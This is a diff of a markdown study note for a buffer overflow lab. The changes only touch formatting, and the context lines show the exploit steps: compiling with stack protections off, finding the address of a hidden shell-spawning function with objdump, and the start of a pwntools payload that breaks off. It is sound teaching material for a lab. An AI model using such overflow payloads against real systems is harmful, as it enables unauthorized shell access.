@@ -13,7 +13,7 @@ date: 2023-01-16
 Follow the concept of lecture [0x00](https://hackmd.io/@UHzVfhAITliOM3mFSo6mfA/SJAt7Pd5s)
 
 ## Original Code
-```cpp!
+```cpp
 #include <stdio.h>
 #include <stdlib.h>
 #include <unistd.h>
@@ -37,7 +37,7 @@ int main()
 The secret function is aim to create a shell, therefore, our main purpose is try to get the shell by using buffer overflow.
 We can check `bof` in the main function that it read the string with length `0x30` that bigger than `buf` size.
 * Note that, if you establish the code yourself, you must turn off the protection by the command below and use `checksec` to observe the protection
-    ```bash!
+    ```bash
     gcc -o bof3 bof3.c -zexecstack -no-pie -fno-stack-protector -z norelro
     ```
     ![](https://imgur.com/ehuCWTI.png)
@@ -46,9 +46,9 @@ We can check `bof` in the main function that it read the string with length `0x3
 
 ## Exploit
 1. Tried to get the address of `y0u_c4n7_533_m3()` by using `objdump -d -M intel bof`. → `0x4011b6`
-![](https://imgur.com/mlaNNCT.png)
+    ![](https://imgur.com/mlaNNCT.png)
 2. Then we can construct the payload as below:
-    ```python!
+    ```python
     from pwn import *
     r = process('./bof')
     magic_addr = 0x4011b6
